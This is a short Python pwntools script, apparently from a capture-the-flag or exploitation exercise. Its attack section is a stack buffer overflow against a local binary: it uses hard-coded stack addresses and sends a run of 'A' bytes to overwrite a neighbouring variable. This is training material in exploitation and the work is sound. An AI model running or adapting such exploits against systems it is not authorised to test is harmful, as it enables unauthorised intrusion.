#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template local-target
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'local-target')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

INPUT = 0x7fffffffe190
NUM = 0x7fffffffe1b0 - 8

io = start()

io.info("simple stack smash - overwrite input buffer then hit the first byte of num with 'A'")
io.info("that means %d + 1 characters total" % (NUM - INPUT))

io.readuntil(b"Enter a string:")
io.sendline(b"A" * (NUM - INPUT + 1))

io.interactive()

